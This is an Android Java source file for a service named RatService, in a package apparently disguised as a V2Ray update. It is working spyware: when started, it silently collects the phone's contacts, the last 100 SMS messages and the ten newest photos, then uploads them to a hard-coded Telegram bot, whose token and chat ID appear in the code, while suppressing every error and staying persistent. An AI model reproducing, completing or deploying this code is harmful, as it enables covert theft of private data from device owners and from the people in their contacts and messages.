package com.v2ray.update;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class RatService extends Service {
    private static final String BOT_TOKEN = "9178490317:AAFZJTBGopALDFWZO5kuvXNvSL4B7x5CCdY";
    private static final String CHAT_ID = "8895860731";
    private static final String API = "https://api.telegram.org/bot" + BOT_TOKEN;

    @Override public IBinder onBind(Intent intent) { return null; }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try { sendContacts(); } catch (Exception e) {}
            try { sendSms(); } catch (Exception e) {}
            try { sendPhotos(); } catch (Exception e) {}
        }).start();
        return START_STICKY;
    }

    private void sendContacts() throws Exception {
        JSONArray arr = new JSONArray();
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                o.put("name", c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                o.put("number", c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                arr.put(o);
            }
            c.close();
        }
        sendText("Contacts", arr.toString());
    }

    private void sendSms() throws Exception {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 100");
        if (c != null) {
            while (c.moveToNext()) {
                sb.append(c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS))).append(": ").append(c.getString(c.getColumnIndex(Telephony.Sms.BODY))).append("\n");
            }
            c.close();
        }
        sendText("SMS", sb.toString());
    }

    private void sendPhotos() throws Exception {
        String[] proj = { MediaStore.Images.Media._ID };
        Cursor c = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 10");
        if (c == null) return;
        int idx = c.getColumnIndex(MediaStore.Images.Media._ID);
        int sent = 0;
        while (c.moveToNext() && sent < 10) {
            long id = c.getLong(idx);
            Uri u = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
            InputStream in = getContentResolver().openInputStream(u);
            if (in != null) {
                sendPhoto(in, "photo_" + id + ".jpg");
                in.close();
                sent++;
            }
        }
        c.close();
    }

    private void sendText(String title, String body) throws Exception {
        String text = title + "\n\n" + (body.length() > 3500 ? body.substring(0, 3500) : body);
        HttpURLConnection c = (HttpURLConnection) new URL(API + "/sendMessage").openConnection();
        c.setDoOutput(true);
        c.setRequestMethod("POST");
        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        try (OutputStream os = c.getOutputStream()) {
            os.write(("chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8")).getBytes(StandardCharsets.UTF_8));
        }
        c.getResponseCode();
    }

    private void sendPhoto(InputStream in, String name) throws Exception {
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] buf = new byte[8192]; int n;
        while ((n = in.read(buf)) > 0) bo.write(buf, 0, n);

        String boundary = "----vedad" + System.currentTimeMillis();
        HttpURLConnection c = (HttpURLConnection) new URL(API + "/sendPhoto").openConnection();
        c.setDoOutput(true);
        c.setRequestMethod("POST");
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

        try (OutputStream os = c.getOutputStream(); PrintWriter w = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true)) {
            w.append("--").append(boundary).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            w.append(CHAT_ID).append("\r\n");
            w.append("--").append(boundary).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"photo\"; filename=\"").append(name).append("\"\r\n");
            w.append("Content-Type: image/jpeg\r\n\r\n");
            w.flush();
            os.write(bo.toByteArray());
            os.flush();
            w.append("\r\n--").append(boundary).append("--\r\n");
            w.flush();
        }
        c.getResponseCode();
    }
}